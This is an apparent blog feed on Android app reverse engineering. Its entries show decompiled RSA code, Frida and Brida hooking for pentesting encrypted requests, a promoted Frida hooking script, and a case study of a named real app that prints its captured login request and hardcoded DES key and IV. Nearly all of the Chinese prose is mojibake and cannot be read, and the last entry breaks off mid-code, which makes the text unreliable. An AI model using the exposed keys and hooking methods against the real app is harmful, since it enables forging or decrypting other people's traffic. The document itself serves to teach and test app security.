comment">/* loaded from: dex_.dex */</span><span class="token keyword">public</span> <span class="token keyword">class</span> u <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">RSAPublicKey</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">,</span> <span class="token class-name">InvalidKeySpecException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">)</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generatePublic</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> unused<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"è§£å¯†å­—ç¬¦ä¸²["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]æ—¶é‡åˆ°å¼‚å¸¸"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* JADX INFO: Access modifiers changed from: package-private */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"åŠ å¯†å­—ç¬¦ä¸²["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]æ—¶é‡åˆ°å¼‚å¸¸"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span> cipher<span class="token punctuation">,</span> <span class="token keyword">int</span> i2<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">,</span> <span class="token keyword">int</span> i3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          æ ¸å¿ƒç®—æ³• ç”±äºè¯¥appç›®å‰åœ¨è¿è¡Œé˜¶æ®µæ‰€ä»¥æ ¸å¿ƒä»£ç æˆ‘å°±å¿½ç•¥äº†ã€‚           <span class="token keyword">return</span> byteArray<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li>ä»”ç»†çœ‹åŠ è§£å¯†ä½¿ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå…¬é’¥ã€‚å…¬é’¥æˆ‘ä»¬ç”¨xxxè¿›è¡Œä»£æ›¿ã€‚è¿™ç§æˆ‘æ˜¯ç¬¬ä¸€æ¬¡è§ç¬‘è„¸ã€‚</li></ul><h2 id="Frida-Hookè„šæœ¬ç¼–å†™ç¡®å®šçŒœæƒ³"><a href="#Frida-Hookè„šæœ¬ç¼–å†™ç¡®å®šçŒœæƒ³" class="headerlink" title="Frida Hookè„šæœ¬ç¼–å†™ç¡®å®šçŒœæƒ³"></a>Frida Hookè„šæœ¬ç¼–å†™ç¡®å®šçŒœæƒ³</h2><ul><li>ç¼–å†™fridaè„šæœ¬éœ€è¦frida apiåŸºç¡€javaå’ŒJavaScriptåŸºç¡€å¦‚æœä¸æ‡‚å»ºè®®å»å­¦ä¹ ã€‚è¿™é‡Œä¸å†è®²è¿°</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041430875.png" alt="firdahookè„šæœ¬ç¼–å†™"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041433635.png" alt="hookæ•ˆæœè¯´æ˜è„šæœ¬ç¼–å†™æ²¡æœ‰é—®é¢˜"></p><h2 id="ä½¿ç”¨åšä¸»ç¼–å†™ç®—æ³•é€šæ€è„šæœ¬å¿«é€Ÿå®šä½"><a href="#ä½¿ç”¨åšä¸»ç¼–å†™ç®—æ³•é€šæ€è„šæœ¬å¿«é€Ÿå®šä½" class="headerlink" title="ä½¿ç”¨åšä¸»ç¼–å†™ç®—æ³•é€šæ€è„šæœ¬å¿«é€Ÿå®šä½"></a>ä½¿ç”¨åšä¸»ç¼–å†™ç®—æ³•é€šæ€è„šæœ¬å¿«é€Ÿå®šä½</h2><ul><li>å¯ä»¥å»é¢‘é“ä¸‹è½½(è¿™ä¸ªåªèƒ½åå‡ºæ˜æ–‡å¹¶ä¸èƒ½å®šä½),ç›´æ¥å®šä½çš„åç»­å†…éƒ¨å‘å¸ƒ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041701386.png" alt="é€šæ€ç®—æ³•å¿«é€Ÿå®šä½1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041702117.png" alt="é€šæ€ç®—æ³•å¿«é€Ÿå®šä½2"></p><h2 id="appåŠ å¯†é€šä¿¡è¿‡ç¨‹"><a href="#appåŠ å¯†é€šä¿¡è¿‡ç¨‹" class="headerlink" title="appåŠ å¯†é€šä¿¡è¿‡ç¨‹"></a>appåŠ å¯†é€šä¿¡è¿‡ç¨‹</h2><ul><li>1:appæ˜æ–‡è¯·æ±‚é€šè¿‡RSA/ECB/PKCS1Padding éå¯¹ç§°ç®—æ³•å¯¹æ˜æ–‡è¯·æ±‚åŠ å¯†</li><li>2:æœåŠ¡å™¨æ”¶åˆ°åŠ å¯†è¯·æ±‚ä½¿ç”¨ç§˜é’¥å¯¹åŠ å¯†è¯·æ±‚è¿›è¡Œè§£å¯†(æ³¨æ„è¿™é‡Œpublic static String b) å¯¹è¯·æ±‚åŠ å¯†çš„æ•°æ®æ— æ³•è§£å¯†å› ä¸ºæ˜¯éå¯¹ç§°çš„åŠ å¯†ç®—æ³•</li><li>3:æŠŠè§£å¯†çš„æ•°æ®åœ¨æœåŠ¡å™¨é‡Œé¢é¡ºåºæ‰§è¡Œåˆ¤æ–­ç­‰ã€‚ç»“æœåœ¨åŠ å¯†ç„¶åå‘é€(å“åº”)ç»™appå®¢æˆ·ç«¯ã€‚</li><li>4:appå®¢æˆ·ç«¯æ”¶åˆ°åŠ å¯†å“åº”ç”¨è‡ªå·±çš„è§£å¯†ç®—æ³•å¯¹å“åº”è¿›è¡Œè§£å¯†</li></ul><h2 id="fridaå’Œbridaå’Œburpä¸appå’ŒæœåŠ¡å™¨çš„å…³ç³»è§£è¯»"><a href="#fridaå’Œbridaå’Œburpä¸appå’ŒæœåŠ¡å™¨çš„å…³ç³»è§£è¯»" class="headerlink" title="fridaå’Œbridaå’Œburpä¸appå’ŒæœåŠ¡å™¨çš„å…³ç³»è§£è¯»"></a>fridaå’Œbridaå’Œburpä¸appå’ŒæœåŠ¡å™¨çš„å…³ç³»è§£è¯»</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041459326.png" alt="å›¾è§£è¯´æ˜å…³ç³»"></p><h2 id="brida-ä¸»åŠ¨è°ƒç”¨jsç¼–å†™"><a href="#brida-ä¸»åŠ¨è°ƒç”¨jsç¼–å†™" class="headerlink" title="brida ä¸»åŠ¨è°ƒç”¨jsç¼–å†™"></a>brida ä¸»åŠ¨è°ƒç”¨jsç¼–å†™</h2><ul><li>ç¼–å†™fridaè„šæœ¬éœ€è¦frida apiåŸºç¡€javaå’ŒJavaScriptåŸºç¡€ Brida ç¼–å†™è„šæœ¬çš„åŸºç¡€ å¦‚æœä¸æ‡‚å»ºè®®å»å­¦ä¹ ã€‚è¿™é‡Œä¸å†è®²è¿°</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041502303.png" alt="brida Rpcè„šæœ¬ç¼–å†™"></p><ul><li>æµ‹è¯•æ˜¯å¦ç”Ÿæ•ˆ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041505150.png" alt="æµ‹è¯•æˆªå›¾"></p><h2 id="brida-ä¸»åŠ¨è°ƒç”¨æ’ä»¶ç¼–å†™"><a href="#brida-ä¸»åŠ¨è°ƒç”¨æ’ä»¶ç¼–å†™" class="headerlink" title="brida ä¸»åŠ¨è°ƒç”¨æ’ä»¶ç¼–å†™"></a>brida ä¸»åŠ¨è°ƒç”¨æ’ä»¶ç¼–å†™</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041515403.png" alt="åŠ å¯†æ’ä»¶"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041518543.png" alt="è§£å¯†æ’ä»¶"></p><h2 id="æœ€ç»ˆæµ‹è¯•æˆªå›¾"><a href="#æœ€ç»ˆæµ‹è¯•æˆªå›¾" class="headerlink" title="æœ€ç»ˆæµ‹è¯•æˆªå›¾"></a>æœ€ç»ˆæµ‹è¯•æˆªå›¾</h2><ul><li>æ­¤ç¯‡æ–‡ç« æä¾›æ€è·¯,å…·ä½“æœ‰ä¸ä¼šç¼–å†™ã€‚æ’ä»¶è‡ªå·±æ€è€ƒä¸€ä¸‹ã€‚æˆ–è€…ç™¾åº¦å‚è€ƒã€‚æ¶‰åŠåˆ°çš„è„šæœ¬å’Œç»†èŠ‚é—®é¢˜ä»¥åå¦‚æœåˆ›å»ºå†…éƒ¨ç¾¤ä¼šè¯¦ç»†è®²è§£ã€‚å…³æ³¨åšä¸»çš„é¢‘é“å’Œgithubä¸»é¡µã€‚äº†è§£æœ€æ–°åŠ¨æ€ã€‚è‡³æ­¤æˆ‘ä»¬å¯ä»¥æŠŠhookå‡ºçš„æ˜æ–‡ç›´æ¥åœ¨repeterorä¸­å¡«å†™ç„¶åå‘é€åˆ©ç”¨bridaå®ç°è‡ªåŠ¨åŠ å¯†è§£å¯†ã€‚æµ‹è¯•appã€‚ä¸è¿‡è¿™ç§éœ€è¦ä¾èµ–appä¸ç¨³å®šå¯èƒ½ã€‚</li>  </ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041519346.png" alt="æœ€ç»ˆæµ‹è¯•ç»“æœ"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå±‚è‡ªåç®—æ³•è„šæœ¬-åŸåˆ›</title>
      <link href="/androidreverse/2023/02/articles/97121a1663073879/"/>
      <url>/androidreverse/2023/02/articles/97121a1663073879/</url>
      
        <content type="html"><![CDATA[<h1 id="frida-ç®—æ³•æ’ä»¶å¼€å‘ä»‹ç»"><a href="#frida-ç®—æ³•æ’ä»¶å¼€å‘ä»‹ç»" class="headerlink" title="frida ç®—æ³•æ’ä»¶å¼€å‘ä»‹ç»"></a>frida ç®—æ³•æ’ä»¶å¼€å‘ä»‹ç»</h1> <ul><li>ç°åœ¨çš„appé€æ¸é‡è§†èµ·å®‰å…¨,æŠŠè¯·æ±‚åŒ…å’Œå“åº”åŒ…é‡‡ç”¨è¿›è¡ŒåŠ å¯†ã€‚æœ‰çš„å¯¹æ•°æ®è¿›è¡Œsignç­¾åæ ¡éªŒã€‚ä½¿æˆ‘ä»¬æŠ“åˆ°åŒ…ä¹Ÿæ— æ³•ç›´æ¥ä¸²æ”¹æ•°æ®ã€‚å¦å¤–appå¯èƒ½å­˜åœ¨æ··æ·†æˆ–è€…æ˜¯åŠ å›ºè¿™ä½¿å¾—æˆ‘ä»¬åˆ©ç”¨åç¼–è¯‘å·¥å…·æ— æ³•å¿«é€Ÿå¾—åˆ°åŠ å¯†ç®—æ³•ã€‚å°±ç®—æ˜¯ç”¨çš„javaå±‚çš„apiæˆ‘ä»¬è‚‰çœ¼å¾ˆéš¾ä¸€ä¸‹çœ‹å‡ºè¿™ä¸ªåŠ å¯†çš„æ–¹å¼æ‰€ä»¥å†™ä¸€ä¸ªfridaè‡ªåç®—æ³•çš„è„šæœ¬å˜å¾—å°¤ä¸ºé‡è¦åœ¨å®‰å“é€†å‘å½“ä¸­ã€‚äºæ˜¯æŠ½ç©ºå¼€å‘å‡ºæ¥ä¸€ä¸ªJavaå±‚é€šæ€ç®—æ³•è„šæœ¬ã€‚è„šæœ¬å¯èƒ½å­˜åœ¨bugã€‚æœ‰æ—¶é—´æˆ–è€…ç²¾åŠ›é‡åˆ°åœ¨å®Œå–„ä¸€ä¸‹ã€‚</li></ul><h2 id="ç®—æ³•ç•Œé¢æˆªå›¾"><a href="#ç®—æ³•ç•Œé¢æˆªå›¾" class="headerlink" title="ç®—æ³•ç•Œé¢æˆªå›¾"></a>ç®—æ³•ç•Œé¢æˆªå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182108012.png" alt="ç®—æ³•ç•Œé¢æˆªå›¾"></p><h2 id="fridaæ¼”ç¤º"><a href="#fridaæ¼”ç¤º" class="headerlink" title="fridaæ¼”ç¤º"></a>fridaæ¼”ç¤º</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182119111.png" alt="fridaæ¼”ç¤º"></p><h2 id="æ˜¯å¦åšä¸»åŸåˆ›"><a href="#æ˜¯å¦åšä¸»åŸåˆ›" class="headerlink" title="æ˜¯å¦åšä¸»åŸåˆ›"></a>æ˜¯å¦åšä¸»åŸåˆ›</h2><pre><code> <pre class="language-none"><code class="language-none">   æ˜¯</code></pre></code></pre><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2>  <ul><li>ä¸‹è½½åœ°å€:https://t.me/SoftwareUpdateChannel/72</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>appæ¸—é€æµ‹è¯•è¯·æ±‚åŒ…åŠ å¯†å¦‚ä½•è¿›è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•</title>
      <link href="/androidreverse/2023/02/articles/ab0a8d0cab6627b4/"/>
      <url>/androidreverse/2023/02/articles/ab0a8d0cab6627b4/</url>
      
        <content type="html"><![CDATA[<h1 id="å˜Ÿå˜Ÿç‰›åœ¨çº¿æ¡ˆä¾‹"><a href="#å˜Ÿå˜Ÿç‰›åœ¨çº¿æ¡ˆä¾‹" class="headerlink" title="å˜Ÿå˜Ÿç‰›åœ¨çº¿æ¡ˆä¾‹"></a>å˜Ÿå˜Ÿç‰›åœ¨çº¿æ¡ˆä¾‹</h1><h2 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h2>  <ul><li>ç”µè„‘usbçœŸæœºè¿æ¥æ‰‹æœºç•Œé¢å¦‚ä¸‹</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131054823.png" alt="ç”µè„‘usbçœŸæœºè¿æ¥"></p>  <ul><li>éšä¾¿è¾“å…¥ç‚¹å‡»ç™»å½•</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131051987.png" alt="éšä¾¿è¾“å…¥ç‚¹å‡»ç™»å½•"></p>  <ul><li>å¯èƒ½è¿”å›2,è¿™é‡Œä½¿ç”¨postern å’ŒCharles æŠ“åŒ…ã€‚é…ç½®å¥½posternä»£ç†</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055974.png" alt="postern å’ŒCharles"><br>    <ul><li>æ‰“å¼€Charlesè¿›è¡ŒæŠ“åŒ…</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055879.png" alt="Charlesè¿›è¡ŒæŠ“åŒ…"></p>  <pre class="language-æŠ“åŒ…ç»†èŠ‚" data-language="æŠ“åŒ…ç»†èŠ‚"><code class="language-æŠ“åŒ…ç»†èŠ‚">POST &#x2F;api&#x2F;user&#x2F;login HTTP&#x2F;1.1If-Modified-Since: Sat, 11 Feb 2023 08:24:10 GMTContent-Type: application&#x2F;json; charset&#x3D;utf-8User-Agent: Dalvik&#x2F;2.1.0 (Linux; U; Android 10; Pixel Build&#x2F;QP1A.191005.007.A3)Host: api.dodovip.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 248&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\&#x2F;\&#x2F;FDsRnlBfgL4lcVxjXii\&#x2F;UNcdXYMk0EFbT8S8sTz7fW\n5ElmCRHm1SJQF76FKmSR9iSVviBXFx+vvRhLM14Q3LH+UIUx2DmyebXLy7V5vYDpFb5iABBQIvTu\nvGJ3s8vC3PVQwH6M+1oELCAimzf0qYiBzKfzU0Id4Rxf\&#x2F;FUJ+OJM5LbrL+rRwTMGBmTms2de\n&quot;&#125;å“åº”åŒ…å¦‚ä¸‹:HTTP&#x2F;1.1 200 OKDate: Sat, 11 Feb 2023 08:26:40 GMTContent-Type: application&#x2F;json;charset&#x3D;utf-8Transfer-Encoding: chunkedServer: NginxContent-Encoding: gzipConnection: keep-alive2v+DC2gq7Rs2vBLjHBwgrO0gyauGMTE6</code></pre><h2 id="ä½¿ç”¨å·¥å…·æŸ¥çœ‹æ˜¯å¦æ˜¯å®‰å“æ§ä»¶å¼€å‘çš„"><a href="#ä½¿ç”¨å·¥å…·æŸ¥çœ‹æ˜¯å¦æ˜¯å®‰å“æ§ä»¶å¼€å‘çš„" class="headerlink" title="ä½¿ç”¨å·¥å…·æŸ¥çœ‹æ˜¯å¦æ˜¯å®‰å“æ§ä»¶å¼€å‘çš„"></a>ä½¿ç”¨å·¥å…·æŸ¥çœ‹æ˜¯å¦æ˜¯å®‰å“æ§ä»¶å¼€å‘çš„</h2>  <ul><li>app ç•Œé¢æ§ä»¶çš„æŸ¥çœ‹ ä½¿ç”¨ uiautomatorviewer.batæ˜¯å¦æ˜¯å®‰å“å¼€å‘çš„</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131056551.png" alt="uiautomatorvieweræ˜¯å¦æ˜¯å®‰å“å¼€å‘çš„"></p><h2 id="æœç´¢è¯·æ±‚åŒ…ç‰¹å¾ä½¿ç”¨fridaç¡®å®šç»è¿‡å‡½æ•°"><a href="#æœç´¢è¯·æ±‚åŒ…ç‰¹å¾ä½¿ç”¨fridaç¡®å®šç»è¿‡å‡½æ•°" class="headerlink" title="æœç´¢è¯·æ±‚åŒ…ç‰¹å¾ä½¿ç”¨fridaç¡®å®šç»è¿‡å‡½æ•°"></a>æœç´¢è¯·æ±‚åŒ…ç‰¹å¾ä½¿ç”¨fridaç¡®å®šç»è¿‡å‡½æ•°</h2>  <ul><li>æˆ‘ä»¬ä½¿ç”¨jadxåç¼–è¯‘ä¸€ä¸‹çœ‹çœ‹</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058522.png" alt="jadxåç¼–è¯‘"><br>  <ul><li>åŒ…åæ˜¯com.dodonew.online  æ¥æœç´¢è¯·æ±‚åŒ…çš„ç‰¹å¾æœç´¢å­—ç¬¦ä¸² â€œEncrypt</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058218.png" alt="å«æœ‰Encryptå­—ç¬¦ä¸²"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100328.png" alt="ä»£ç æˆªå›¾"><br>  <ul><li>æœç´¢å‡ºæœ‰ä¸¤ä¸ª,ç¡®å®šåˆ°åº•æ˜¯å“ªä¸ªä½¿ç”¨fridaæ¥hookåˆ¤æ–­ç¡®å®š</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100911.png" alt="frida hookåˆ¤æ–­"><br>  <ul><li>com.dodonew.online.http.JsonRequest  çš„è¿™ä¸ªæ–¹æ³•æ˜¯èµ°çš„</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131101056.png" alt="ç¡®å®šåŠ å¯†æµç¨‹1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131102689.png" alt="ç¡®å®šåŠ å¯†æµç¨‹2"><br>  <ul><li>com.dodonew.online.http.JsonRequest    paraMap è¿™ä¸ªç™»é™†æ˜¯ä¸èµ°çš„</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131103661.png" alt="ç¡®å®šä¸èµ°è¿™ä¸ªæµç¨‹"></p><h2 id="è·Ÿè¸ªåˆ†ææµç¨‹å’ŒåŠ å¯†ç®—æ³•"><a href="#è·Ÿè¸ªåˆ†ææµç¨‹å’ŒåŠ å¯†ç®—æ³•" class="headerlink" title="è·Ÿè¸ªåˆ†ææµç¨‹å’ŒåŠ å¯†ç®—æ³•"></a>è·Ÿè¸ªåˆ†ææµç¨‹å’ŒåŠ å¯†ç®—æ³•</h2>  <ul><li>å°±çœ‹ç¬¬ä¸€ä¸ªäº†ä»£ç å¦‚ä¸‹</li></ul>  <pre class="language-java" data-language="java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addRequestMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> addMap<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> time <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addMap <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>addMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>addMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"timeStamp"</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">paraMap</span><span class="token punctuation">(</span>addMap<span class="token punctuation">,</span> <span class="token class-name">Config</span><span class="token punctuation">.</span>BASE_APPEND<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> encrypt <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">encodeDesMap</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desKey<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desIV<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key 65102933  iv  32028092</span><span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>obj<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Encrypt"</span><span class="token punctuation">,</span> encrypt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>mRequestBody <span class="token operator">=</span> obj <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_IV <span class="token operator">=</span> <span class="token string">"32028092"</span><span class="token punctuation">;</span>  <span class="token comment">//å­—ç¬¦ä¸²</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_KEY <span class="token operator">=</span> <span class="token string">"65102933"</span> <span class="token comment">//å­—ç¬¦ä¸²</span><span class="token keyword">this</span><span class="token punctuation">.</span>enCipher <span class="token operator">=</span> 